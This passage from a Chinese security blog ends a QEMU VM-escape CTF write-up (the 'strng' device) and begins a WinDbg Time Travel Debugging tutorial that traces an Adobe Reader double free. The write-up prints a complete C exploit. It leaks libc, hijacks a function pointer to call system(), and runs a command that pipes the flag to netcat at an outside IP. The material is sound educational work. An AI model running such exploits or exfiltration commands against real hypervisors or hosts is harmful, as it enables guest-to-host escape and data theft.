ptr [rdi + 0xaf0], edx的下一行！！！查看内存，可以看到我们的666已经写进去了，包括换行，而且最后那三个就是srand，rand，rand_r函数指针 12345678910111213141516171819gdb-peda$ x /36gx $rdi + 0xaf00x555557e2c3b0: 0x000000000a363636 0x00000000000000000x555557e2c3c0: 0x0000000000000000 0x00000000000000000x555557e2c3d0: 0x0000000000000000 0x00000000000000000x555557e2c3e0: 0x0000000000000000 0x00000000000000000x555557e2c3f0: 0x0000000000000000 0x00000000000000000x555557e2c400: 0x0000000000000000 0x00000000000000000x555557e2c410: 0x0000000000000000 0x00000000000000000x555557e2c420: 0x0000000000000000 0x00000000000000000x555557e2c430: 0x0000000000000000 0x00000000000000000x555557e2c440: 0x0000000000000000 0x00000000000000000x555557e2c450: 0x0000000000000000 0x00000000000000000x555557e2c460: 0x0000000000000000 0x00000000000000000x555557e2c470: 0x0000000000000000 0x00000000000000000x555557e2c480: 0x0000000000000000 0x00000000000000000x555557e2c490: 0x0000000000000000 0x00000000000000000x555557e2c4a0: 0x0000000000000000 0x00000000000000000x555557e2c4b0: 0x0000000000000000 0x00007ffff65268d00x555557e2c4c0: 0x00007ffff6526f60 0x00007ffff6526f70 我们先泄露srand的值（即上面的0x00007ffff65268d0），由于我用的是ubuntu 16.04运行的qemu，所以我们泄露两次，一次泄露4个字节，先看看偏移 泄露的代码是result = opaque-&gt;regs[v4 &gt;&gt; 2];，所以偏移是相对于opaque-&gt;regs，regs偏移是0xaf4，而且regs是uint_t32数组 1234gdb-peda$ x /wx $rdi + 0xaf4 + 0x1040x555557e2c4b8: 0xf65268d0gdb-peda$ x /wx $rdi + 0xaf4 + 0x1080x555557e2c4bc: 0x00007fff 泄露简析： 先写好pmio的读和写 1234567891011121314void pmio_write(unsigned int val, unsigned int addr) &#123; outl(val, addr);&#125;unsigned int pmio_read(unsigned int offset) &#123; if (offset == 0) &#123; // 获取opaque-&gt;addr的值,其实这题没用到这功能 return inl(pmio_base); &#125;else&#123; // 设置opaque-&gt;addr的值为offset，再将opaque-&gt;regs[offset &gt;&gt; 2]的值读出，其中regs为uint_32_t类型 pmio_write(offset, pmio_base); return inl(pmio_base + 4); &#125;&#125; 之后我们就可以读取了 123456789101112if (0 != iopl(3)) &#123; perror(\"iopl permissions\"); return -1; &#125; // leak srand, 分两次一次泄露4个byte // 泄露高位，再泄露低位 srand_addr = pmio_read(0x108); srand_addr = srand_addr &lt;&lt; 32; srand_addr = srand_addr | pmio_read(0x104); printf(\"srand_addr: %llx\\n\", srand_addr); 我们看看调试中状态，先往opaque-&gt;addr写入0x108 12gdb-peda$ x /gx $rdi +0xaf00x555557e2c3b0: 0x0000000000000108 再到strng_pmio_read那里泄露出来 10x555555964501 &lt;strng_pmio_read+81&gt; mov eax, dword ptr [rdi + rdx*4 + 0xaf4] 查看下内存，先泄露的高4为，同理低四位也如此 12gdb-peda$ x /wx $rdi + $rdx*4 + 0xaf40x555557e2c4bc: 0x00007fff 那我们就可以获得srand的地址 12ubuntu@ubuntu:~$ sudo ./expsrand_addr: 7ffff65268d0 接下里是我们写入的命令&quot;cat /root/flag | nc 192.168.52.181 12345&quot;，ip端口自行修改，但是总长度最好是4的倍数，不然最后自己补\\x00了 123&gt;&gt;&gt; from pwn import *&gt;&gt;&gt; map(hex, unpack_many(&quot;cat /root/flag | nc 192.168.52.181 12345&quot;))[&apos;0x20746163&apos;, &apos;0x6f6f722f&apos;, &apos;0x6c662f74&apos;, &apos;0x7c206761&apos;, &apos;0x20636e20&apos;, &apos;0x2e323931&apos;, &apos;0x2e383631&apos;, &apos;0x312e3235&apos;, &apos;0x31203138&apos;, &apos;0x35343332&apos;] 值得注意的是我们写入0xc偏移的时候，会进入到rand_r分支，导致opaque-&gt;regs[2]的位置被更改，不信看看rand_r的源码 12345678910111213141516171819intrand_r (unsigned int *seed)&#123; unsigned int next = *seed; int result; next *= 1103515245; next += 12345; result = (unsigned int) (next / 65536) % 2048; next *= 1103515245; next += 12345; result &lt;&lt;= 10; result ^= (unsigned int) (next / 65536) % 1024; next *= 1103515245; next += 12345; result &lt;&lt;= 10; result ^= (unsigned int) (next / 65536) % 1024; *seed = next; &lt;=================================就是这里会更改传进的seed return result;&#125; 所以这样写是有问题的，知道参考文章为何掉转过来了吧 12mmio_write(0x20746163, 8);mmio_write(0x6f6f722f, 0xc); 要这样写 12345678910mmio_write(0x6f6f722f, 0xc); mmio_write(0x20746163, 8); mmio_write(0x6c662f74, 0x10); mmio_write(0x7c206761, 0x14); mmio_write(0x20636e20, 0x18); mmio_write(0x2e323931, 0x1c); mmio_write(0x2e383631, 0x20); mmio_write(0x312e3235, 0x24); mmio_write(0x31203138, 0x28); mmio_write(0x35343332, 0x2c); 最后就是改写rand_r指针，调用rand_r了 12345 // 改写rand_r指针为system pmio_arb_write(system_addr , 0x114);//调用opaque-&gt;rand_r(&amp;opaque-&gt;regs[2])//// 666 并不重要可以随意写mmio_write(666, 12); 调用rand_r通过pmio也行 123// 或者调用pmio也行(下面的666也是随意) pmio_write(12, pmio_base); pmio_write(666, pmio_base+4); 最终完整exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;fcntl.h&gt;#include &lt;ctype.h&gt;#include &lt;termios.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/io.h&gt;#define MAP_SIZE 4096UL#define MAP_MASK (MAP_SIZE - 1)unsigned int pmio_base = 0xc050;char* pci_device_name = &quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;;// unsigned int mmio_addr_base = 0xfebf1000;// unsigned int mmio_size = 256;void pmio_write(unsigned int val, unsigned int addr) &#123; outl(val, addr);&#125;void pmio_arb_write(unsigned int val, unsigned int offset) &#123; // 假如offset右移2的值为1，3会调用rand和rand_r int tmp = offset &gt;&gt; 2; if ( tmp == 1 || tmp == 3) &#123; puts(&quot;PMIO write address is a command&quot;); return; &#125; pmio_write(offset, pmio_base); pmio_write(val, pmio_base + 4);&#125;unsigned int pmio_read(unsigned int offset) &#123; if (offset == 0) &#123; // 获取opaque-&gt;addr的值,其实这题没用到这功能 return inl(pmio_base); &#125;else&#123; // 设置opaque-&gt;addr的值为offset，再将opaque-&gt;regs[offset &gt;&gt; 2]的值读出，其中regs为uint_32_t类型 pmio_write(offset, pmio_base); return inl(pmio_base + 4); &#125;&#125;void mmio_write(unsigned int val, unsigned int offset) &#123; int fd; void *map_base, *virt_addr; if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) &#123; perror(&quot;open pci device&quot;); exit(-1); &#125; map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); if(map_base == (void *) -1) &#123; perror(&quot;mmap&quot;); exit(-1); &#125; virt_addr = map_base + (offset &amp; MAP_MASK); *((unsigned int*) virt_addr) = val; if(munmap(map_base, MAP_SIZE) == -1) &#123; perror(&quot;munmap&quot;); exit(-1); &#125; close(fd);&#125;unsigned int mmio_read(unsigned int offset) &#123; int fd; void *map_base, *virt_addr; if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) &#123; perror(&quot;open pci device&quot;); exit(-1); &#125; map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); if(map_base == (void *) -1) &#123; perror(&quot;mmap&quot;); exit(-1); &#125; virt_addr = map_base + (offset &amp; MAP_MASK); if(munmap(map_base, MAP_SIZE) == -1) &#123; perror(&quot;munmap&quot;); exit(-1); &#125; close(fd); return *((unsigned int*) virt_addr);&#125;int main(int argc, char const *argv[])&#123; unsigned long long srand_addr; unsigned long long libc_base; unsigned long long system_addr; // 获得端口访问权限 if (0 != iopl(3)) &#123; perror(&quot;iopl permissions&quot;); return -1; &#125; // leak srand, 分两次一次泄露4个byte // 泄露高位，再泄露低位 srand_addr = pmio_read(0x108); srand_addr = srand_addr &lt;&lt; 32; srand_addr = srand_addr | pmio_read(0x104); printf(&quot;srand_addr: %llx\\n&quot;, srand_addr); system_addr = srand_addr + 43712; printf(&quot;system_addr: %llx\\n&quot;, system_addr);// 将我们要执行的命令写入MMIO，从rand_r偏移8处开始写，因为调用的时候是opaque-&gt;rand_r(&amp;opaque-&gt;regs[2]);// &gt;&gt;&gt; from pwn import *// &gt;&gt;&gt; map(hex, unpack_many(&quot;cat /root/flag | nc 192.168.52.181 12345&quot;))// [&apos;0x20746163&apos;, &apos;0x6f6f722f&apos;, &apos;0x6c662f74&apos;, &apos;0x7c206761&apos;, &apos;0x20636e20&apos;, &apos;0x2e323931&apos;, &apos;0x2e383631&apos;, &apos;0x312e3235&apos;, &apos;0x31203138&apos;, &apos;0x35343332&apos;] mmio_write(0x6f6f722f, 0xc); mmio_write(0x20746163, 8); mmio_write(0x6c662f74, 0x10); mmio_write(0x7c206761, 0x14); mmio_write(0x20636e20, 0x18); mmio_write(0x2e323931, 0x1c); mmio_write(0x2e383631, 0x20); mmio_write(0x312e3235, 0x24); mmio_write(0x31203138, 0x28); mmio_write(0x35343332, 0x2c); // 改写rand_r指针为system pmio_arb_write(system_addr , 0x114); // 调用 strng_mmio_write中addr &gt;&gt; 2为3时候的分支，即调用opaque-&gt;rand_r(&amp;opaque-&gt;regs[2]) // 666 并不重要可以随意写 // mmio_write(666, 12); // 或者调用pmio也行(下面的666也是随意) pmio_write(12, pmio_base); pmio_write(666, pmio_base+4); return 0;&#125; 在主机伪造一个flag文件，就可以收到flag了 或者来个弹计算器也行，这个好像很装逼。。。 system(“gnome-calculator”)就行 补充——关于编译与上传exp编译一般是静态编译了，这里目标系统是32的，本地调试上传exp我用scp，比赛的话据说是用base64。。。。。 我写了个脚本，但是第二条命令，需要先ssh正常连接一次，信任那个公钥，才能正常使用 123giantbranch@ubuntu:~/qemu_escape$ cat compile_uploadexp.shgcc -o exp -m32 -static ./exp.csshpass -p &quot;passw0rd&quot; scp -P 5555 exp ubuntu@127.0.0.1:/home/ubuntu 参考主要参考https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html 其他参考https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledgehttps://web.cs.elte.hu/local/Linux-bible/IO-Port-Programming/node2.htmlhttp://man7.org/linux/man-pages/man2/ioperm.2.html","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"qemu","slug":"qemu","permalink":"https://www.giantbranch.cn/tags/qemu/"},{"name":"vm escape","slug":"vm-escape","permalink":"https://www.giantbranch.cn/tags/vm-escape/"}]},{"title":"windbg时间穿梭——利用Time Travel Debugging更方便地调试漏洞","slug":"windbg时间穿梭——利用Time Travel Debugging更方便地调试漏洞","date":"2019-11-04T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2019/11/04/windbg时间穿梭——利用Time Travel Debugging更方便地调试漏洞/","link":"","permalink":"https://www.giantbranch.cn/2019/11/04/windbg时间穿梭——利用Time Travel Debugging更方便地调试漏洞/","excerpt":"","text":"下面使用windbg是新版的windbg，叫windbg preview，需要在微软商店（Microsoft Store）中下载安装 新版的windbg具有更现代的视觉效果，速度更快，更完善的脚本编写体验以及Time Travel Debugging 特性 需要注意的是，Time Travel Debugging特性的开启需要以管理员权限运行，之后使用advanced打开并勾选对应的选项即可，最后配置一下记录的保存路径即可 当然你也可以attach到正在运行的程序，或者打开别人的trace file 有了Time Travel Debugging，你几乎可以像本地看电影一样，不断来回脱动进度条，而且这个还是本地化，免去了查找漏洞软件，搭建环境，验证漏洞的烦恼，只需要拿到别人的TTD的记录文件即可，而且调试过程地址还不会变，爽不爽。 Time Travel Debugging 初探我们随便找一个windows程序，看看这个新特性 一开始载入没什么反应，以为出什么事了，原来是这个特性载入程序，速度太慢了 对于我们常用的p,t,g,假如想反向执行，只需在指令后面加个”-“号 1234567891011121314151617181920212223242526272829300:000&gt; pTime Travel Position: 63:3F**** WARNING loaded *kernel* extension dll for usermodeeax=559b1944 ebx=02bfe000 ecx=00000001 edx=0099b720 esi=00991100 edi=00991100eip=00992158 esp=0098f9c0 ebp=0098f9dc iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000202learnCFG!main+0x8:00992158 b8cccccccc mov eax,0CCCCCCCCh0:000&gt; pTime Travel Position: 63:40**** WARNING loaded *kernel* extension dll for usermodeeax=cccccccc ebx=02bfe000 ecx=00000001 edx=0099b720 esi=00991100 edi=00991100eip=0099215d esp=0098f9c0 ebp=0098f9dc iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000202learnCFG!main+0xd:0099215d 8945ec mov dword ptr [ebp-14h],eax ss:002b:0098f9c8=0098f9d40:000&gt; p-Time Travel Position: 63:3F**** WARNING loaded *kernel* extension dll for usermodeeax=559b1944 ebx=02bfe000 ecx=00000001 edx=0099b720 esi=00991100 edi=00991100eip=00992158 esp=0098f9c0 ebp=0098f9dc iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000202learnCFG!main+0x8:00992158 b8cccccccc mov eax,0CCCCCCCCh 可以看到，假如我们一步小心，执行过了，还可以回退，可以回到当初的状态看看寄存器，内存，这是相当好的东西，有后悔药吃了。 有时候我们执行过了头，想要跟进去那个函数，也是可以回头进去的 1234567891011121314151617181920212223242526272829303132333435eax=12fd94d0 ebx=02bfe000 ecx=009913a0 edx=00000000 esi=0098f9c0 edi=0098f9bceip=009921d1 esp=0098f9bc ebp=0098f9dc iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246learnCFG!main+0x81:009921d1 ff1500e09900 call dword ptr [learnCFG!__guard_check_icall_fptr (0099e000)] ds:002b:0099e000=&#123;ntdll!LdrpValidateUserCallTarget (77408be0)&#125;0:000&gt; pTime Travel Position: 67:85**** WARNING loaded *kernel* extension dll for usermodeeax=00132274 ebx=02bfe000 ecx=009913a0 edx=10100444 esi=0098f9c0 edi=0098f9bceip=009921d7 esp=0098f9bc ebp=0098f9dc iopl=0 nv up ei pl zr na pe cycs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000247learnCFG!main+0x87:009921d7 3bfc cmp edi,esp0:000&gt; p-Time Travel Position: 67:79**** WARNING loaded *kernel* extension dll for usermodeeax=12fd94d0 ebx=02bfe000 ecx=009913a0 edx=00000000 esi=0098f9c0 edi=0098f9bceip=009921d1 esp=0098f9bc ebp=0098f9dc iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246learnCFG!main+0x81:009921d1 ff1500e09900 call dword ptr [learnCFG!__guard_check_icall_fptr (0099e000)] ds:002b:0099e000=&#123;ntdll!LdrpValidateUserCallTarget (77408be0)&#125;0:000&gt; tTime Travel Position: 67:7D**** WARNING loaded *kernel* extension dll for usermodeeax=00009913 ebx=02bfe000 ecx=009913a0 edx=009b0000 esi=0098f9c0 edi=0098f9bceip=77408beb esp=0098f9b8 ebp=0098f9dc iopl=0 nv up ei pl nz na po cycs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000203ntdll!LdrpValidateUserCallTargetBitMapCheck:77408beb 8b1482 mov edx,dword ptr [edx+eax*4] ds:002b:009d644c=10100444 我们看看记录的目录，共有三个文件，.run是trace文件，idx是索引文件，索引文件可以让我们更快地访问跟踪信息。假如我们只有.run文件，也是可以的，当WinDbg Preview打开跟踪文件（.run）时，索引文件也会自动创建。 利用别人的跟踪文件调试这是参考文章的作者给的文件，一个.run文件就592M了，但是可以免除搭建环境，1个G甚至8个G我都能接受 这个漏洞是Adobe Acrobat Reader DC for Windows - Double Free due to Malformed JP2 Stream(CVE-2019-8044)，POC可以在下面下载 https://www.exploit-db.com/exploits/47279 我就不下载POC复现了，直接用作者的跟踪文件分析，载入run文件后，直接g，触发崩溃 12345678910111213141516171819202122Time Travel Position: 224FB2:1eax=000d0004 ebx=00000000 ecx=ffffd8f0 edx=770d2330 esi=00003a98 edi=00000000eip=67ce7001 esp=010cc25c ebp=010cc2a8 iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=0000024667ce7001 0970ce or dword ptr [eax-32h],esi ds:002b:000cffd2=????????0:001&gt; kv # ChildEBP RetAddr Args to Child WARNING: Frame IP not in any known module. Following frames may be wrong.00 010cc258 770bdc2c 770ffa22 000006d4 00000000 0x67ce700101 010cc25c 770ffa22 000006d4 00000000 010cc290 ntdll!NtWaitForSingleObject+0xc (FPO: [3,0,0])02 010cc2a8 770ff802 010cce6c 00000568 00000000 ntdll!WaitForWerSvc+0x77 (FPO: [Non-Fpo])03 010cc338 770fed66 00000000 000002dc 00000000 ntdll!SendMessageToWERService+0x5d (FPO: [Non-Fpo])04 010cce28 770ff3b1 010cd25c 00000004 00000000 ntdll!ReportExceptionInternal+0xde (FPO: [4,695,4])05 010cd288 770fee0a 00000000 00000000 00000000 ntdll!RtlReportExceptionHelper+0x29d (FPO: [Non-Fpo])06 010cd2ac 77129865 010cd424 010cd474 00000000 ntdll!RtlReportException+0x6a (FPO: [3,3,4])07 010cd2bc 770c20b0 010cd964 00000001 fffffffe ntdll!RtlReportCriticalFailure+0xad (FPO: [SEH])08 010cd2d0 770c19c0 00000000 00000000 00000000 ntdll!_EH4_CallFilterFunc+0x12 (FPO: [Uses EBP] [0,0,4])09 010cd2fc 770c5e00 771632d4 770bfbd0 010cd424 ntdll!_except_handler4_common+0x80 (FPO: [Non-Fpo])0a 010cd31c 770d23b2 010cd424 010cd954 010cd474 ntdll!_except_handler4+0x20 (FPO: [Non-Fpo])0b 010cd340 770d2384 010cd424 010cd954 010cd474 ntdll!ExecuteHandler2+0x260c 010cd40c 770bff1f 010cd424 010cd474 010cd424 ntdll!ExecuteHandler+0x240d 010cd964 00000000 00000001 00000002 7712b763 ntdll!KiUserExceptionDispatcher+0xf (FPO: [2,0,0]) (CONTEXT @ ffffffff) 可以看到这里面看不到什么有用的东西，都是windows的异常处理函数相关的，而且我们通过信息已经知道这个漏洞是double free了，可能是free的时候崩溃的，我们需要向上回溯 通过不断点击step out back，或者命令g-u去不断返回，但是我们到ntdll!KiUserExceptionDispatcher+0xf的时候再返回，就变成载入时的状态，所以到这一步我们应该点击step over back，或者命令p-，多step over back几次即可 最终可以执行下面命令回到真正触发崩溃的地方 1g-u;g-u;g-u;g-u;g-u;g-u;g-u;g-u;g-u;g-u;g-u;g-u;g-u;p-;p-;p-;p-;p-;p-; 再看下此时的栈，是MSVCR120!free之后调用ntdll!RtlFreeHeap失败，最终进入ntdll!RtlpLogHeapFailure处理 123456789101112131415161718192021222324252627280:001&gt; kb # ChildEBP RetAddr Args to Child WARNING: Frame IP not in any known module. Following frames may be wrong.00 010cd5e0 770bf13c 770d2595 010cd8f8 010cd5f8 0x67ce700001 010cd5e4 770d2595 010cd8f8 010cd5f8 00000001 ntdll!NtRaiseException+0xc02 010cd8c8 77129841 010cd8f8 3a9cf7ad 1fb1c848 ntdll!RtlRaiseException+0x3503 010cd964 7712cfe2 00000001 00000002 7712b763 ntdll!RtlReportCriticalFailure+0x8904 010cd970 7712b763 01670000 00000002 010cd9b0 ntdll!RtlpReportHeapFailure+0x3205 010cd980 770d16cf 3a9cf779 01670000 1fb1c848 ntdll!RtlpHeapHandleError+0x1c06 010cd9b0 770e23be 1fb1c848 00000000 00000000 ntdll!RtlpLogHeapFailure+0x9f07 010cd9e4 6b1becfa 01670000 00000000 1fb1c850 ntdll!RtlFreeHeap+0x4abce08 010cd9f8 6a18b2a7 1fb1c850 277326dc 010cdb5c MSVCR120!free+0x1a [f:\\dd\\vctools\\crt\\crtw32\\heap\\free.c @ 51] 09 010cdb0c 6a17bc96 010cdb7c 00000001 00000b20 AcroRd32!CTJPEGTiledContentWriter::operator=+0x12c830a 010cdcd4 6a179c26 00000000 00000000 00000000 AcroRd32!CTJPEGTiledContentWriter::operator=+0x36720b 010cdd08 6a171033 1ff1e030 074eaf44 074eaf60 AcroRd32!CTJPEGTiledContentWriter::operator=+0x16020c 010cdd1c 6a1654a7 1ff1e030 000033f8 07637cd8 AcroRd32!AX_PDXlateToHostEx+0x2714480d 010cddc4 69c7c595 074eaf44 00000001 078438e0 AcroRd32!AX_PDXlateToHostEx+0x2658bc0e 010cdde0 69c7c4a9 20a54028 00000001 0013d690 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x22d4d0f 010cde00 69c119d7 010cde20 20a54028 0013d690 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x22c6110 010cde28 69c1198d 20a54028 00000001 0013d690 AcroRd32!AcroWinBrowserMain+0x19eb311 010cde3c 69cb0c16 20a54028 00000001 0013d690 AcroRd32!AcroWinBrowserMain+0x19e6912 010cde54 69d8d21a 20a54028 00000001 0013d690 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x573ce13 010cdea8 6a0ee398 00000000 00000e44 076a1e54 AcroRd32!CTJPEGDecoderHasMoreTiles+0xf4a14 010cdf20 69ff0017 010cdf40 010cdf50 277322b4 AcroRd32!AX_PDXlateToHostEx+0x1ee7ad15 010cdf64 6b369939 07557880 010cdf88 26c94051 AcroRd32!AX_PDXlateToHostEx+0xf042c16 010ce010 6b5f6028 075578d8 010ce024 00000000 AGM!AGMGetVersion+0x1426317 010ce028 6b2fb9af 010ce0cc 26c97f11 00112015 AGM!AGMGetVersion+0x2a095218 00000000 00000000 00000000 00000000 00000000 AGM!AGMInitialize+0x33153 我们看看什么导致checkfail了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586Time Travel Position: 222B02:6Feax=6ae3fb4c ebx=1fb1c850 ecx=00000008 edx=01670000 esi=1fb1c848 edi=01670000eip=770e23b9 esp=010cd9b8 ebp=010cd9e4 iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246ntdll!RtlFreeHeap+0x4abc9:770e23b9 e872f2feff call ntdll!RtlpLogHeapFailure (770d1630)0:001&gt; t-Time Travel Position: 222B02:6E**** WARNING loaded *kernel* extension dll for usermodeeax=6ae3fb4c ebx=1fb1c850 ecx=1fb1c850 edx=01670000 esi=1fb1c848 edi=01670000eip=770e23b4 esp=010cd9b8 ebp=010cd9e4 iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246ntdll!RtlFreeHeap+0x4abc4:770e23b4 b908000000 mov ecx,80:001&gt; t-Time Travel Position: 222B02:6D**** WARNING loaded *kernel* extension dll for usermodeeax=6ae3fb4c ebx=1fb1c850 ecx=1fb1c850 edx=00000000 esi=1fb1c848 edi=01670000eip=770e23b2 esp=010cd9b8 ebp=010cd9e4 iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246ntdll!RtlFreeHeap+0x4abc2:770e23b2 8bd7 mov edx,edi0:001&gt; t-Time Travel Position: 222B02:6C**** WARNING loaded *kernel* extension dll for usermodeeax=6ae3fb4c ebx=1fb1c850 ecx=1fb1c850 edx=00000000 esi=1fb1c848 edi=01670000eip=770e23b1 esp=010cd9bc ebp=010cd9e4 iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246ntdll!RtlFreeHeap+0x4abc1:770e23b1 56 push esi0:001&gt; t-Time Travel Position: 222B02:6B**** WARNING loaded *kernel* extension dll for usermodeeax=6ae3fb4c ebx=1fb1c850 ecx=1fb1c850 edx=00000000 esi=1fb1c848 edi=01670000eip=770e23af esp=010cd9c0 ebp=010cd9e4 iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246ntdll!RtlFreeHeap+0x4abbf:770e23af 6a00 push 00:001&gt; t-Time Travel Position: 222B02:6A**** WARNING loaded *kernel* extension dll for usermodeeax=6ae3fb4c ebx=1fb1c850 ecx=1fb1c850 edx=00000000 esi=1fb1c848 edi=01670000eip=770e23ad esp=010cd9c4 ebp=010cd9e4 iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246ntdll!RtlFreeHeap+0x4abbd:770e23ad 6a00 push 00:001&gt; t-Time Travel Position: 222B02:69**** WARNING loaded *kernel* extension dll for usermodeeax=6ae3fb4c ebx=1fb1c850 ecx=1fb1c850 edx=00000000 esi=1fb1c848 edi=01670000eip=770e23ab esp=010cd9c8 ebp=010cd9e4 iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246ntdll!RtlFreeHeap+0x4abbb:770e23ab 6a00 push 00:001&gt; t-Time Travel Position: 222B02:68**** WARNING loaded *kernel* extension dll for usermodeeax=6ae3fb4c ebx=1fb1c850 ecx=1fb1c850 edx=00000000 esi=1fb1c848 edi=01670000eip=77097855 esp=010cd9c8 ebp=010cd9e4 iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246ntdll!RtlFreeHeap+0x65:77097855 0f8450ab0400 je ntdll!RtlFreeHeap+0x4abbb (770e23ab) [br=1]0:001&gt; t-Time Travel Position: 222B02:67**** WARNING loaded *kernel* extension dll for usermodeeax=6ae3fb4c ebx=1fb1c850 ecx=1fb1c850 edx=00000000 esi=1fb1c848 edi=01670000eip=77097851 esp=010cd9c8 ebp=010cd9e4 iopl=0 ov up ei pl nz ac pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000a16ntdll!RtlFreeHeap+0x61:77097851 f646073f test byte ptr [esi+7],3Fh ds:002b:1fb1c84f=80 原来是这个77097851 f646073f test byte ptr [esi+7],3Fh ds:002b:1fb1c84f=80 这个地址肯定被改写了才导致检查是吧，所以我们可以对这个地址下一个写入断点，之后往回走，g-就行，实在太方便了 12ba w1 1fb1c84fg- 由于这个断下来会停在写入的下一个指令，所以还要p-一下 123456789100:001&gt; p-Time Travel Position: 222B02:B**** WARNING loaded *kernel* extension dll for usermodeeax=0317022d ebx=1fb1c848 ecx=8317022d edx=0317022d esi=0317022d edi=078410c0eip=77097953 esp=010cd990 ebp=010cd9bc iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246ntdll!RtlpLowFragHeapFree+0x93:77097953 c6430780 mov byte ptr [ebx+7],80h ds:002b:1fb1c84f=88 这时再看一下栈，可以看到MSVCR120!free(void * pBlock = 0x1fb1c850)+0x1a，是free(0x1fb1c850)后导致的写入，而且这个栈跟上面的有所区别，所以这应该是第一次free，写入了0x80后，导致第二次free失败了。 123456789101112131415161718192021220:001&gt; kp # ChildEBP RetAddr 00 010cd9bc 7709787d ntdll!RtlpLowFragHeapFree+0x9301 010cd9e4 6b1becfa ntdll!RtlFreeHeap+0x8d02 010cd9f8 6a18b296 MSVCR120!free(void * pBlock = 0x1fb1c850)+0x1a [f:\\dd\\vctools\\crt\\crtw32\\heap\\free.c @ 51] WARNING: Stack unwind information not available. Following frames may be wrong.03 010cdb0c 6a17bc96 AcroRd32!CTJPEGTiledContentWriter::operator=+0x12c7204 010cdcd4 6a179c26 AcroRd32!CTJPEGTiledContentWriter::operator=+0x367205 010cdd08 6a171033 AcroRd32!CTJPEGTiledContentWriter::operator=+0x160206 010cdd1c 6a1654a7 AcroRd32!AX_PDXlateToHostEx+0x27144807 010cddc4 69c7c595 AcroRd32!AX_PDXlateToHostEx+0x2658bc08 010cdde0 69c7c4a9 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x22d4d09 010cde00 69c119d7 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x22c610a 010cde28 69c1198d AcroRd32!AcroWinBrowserMain+0x19eb30b 010cde3c 69cb0c16 AcroRd32!AcroWinBrowserMain+0x19e690c 010cde54 69d8d21a AcroRd32!CTJPEGWriter::CTJPEGWriter+0x573ce0d 010cdea8 6a0ee398 AcroRd32!CTJPEGDecoderHasMoreTiles+0xf4a0e 010cdf20 69ff0017 AcroRd32!AX_PDXlateToHostEx+0x1ee7ad0f 010cdf64 6b369939 AcroRd32!AX_PDXlateToHostEx+0xf042c10 010ce010 6b5f6028 AGM!AGMGetVersion+0x1426311 010ce028 6b2fb9af AGM!AGMGetVersion+0x2a095212 00000000 00000000 AGM!AGMInitialize+0x33153 参考文章的作者还给出了TTD的一个牛逼的命令，可以看到MSVCR120!malloc什么时候返回0x1fb1c850注：下面中括号的四个可能会变 1234560:001&gt; dx -r1 @$cursession.TTD.Calls(&quot;MSVCR120!malloc&quot;).Where(c =&gt; c.ReturnValue == (void *)0x1fb1c850)@$cursession.TTD.Calls(&quot;MSVCR120!malloc&quot;).Where(c =&gt; c.ReturnValue == (void *)0x1fb1c850) [0x231fe] [0x3991b] [0x3c926] [0x3e405] 之后可以在后面加个中括号去访问对应的那个状态，可以看到他的时间点去判断是在free之前malloc的还是之后（下面的TimeStart） 12345678910111213140:001&gt; dx -r1 @$cursession.TTD.Calls(&quot;MSVCR120!malloc&quot;).Where(c =&gt; c.ReturnValue == (void *)0x1fb1c850)[0x231fe]@$cursession.TTD.Calls(&quot;MSVCR120!malloc&quot;).Where(c =&gt; c.ReturnValue == (void *)0x1fb1c850)[0x231fe] EventType : 0x0 ThreadId : 0x146c UniqueThreadId : 0x8 TimeStart : 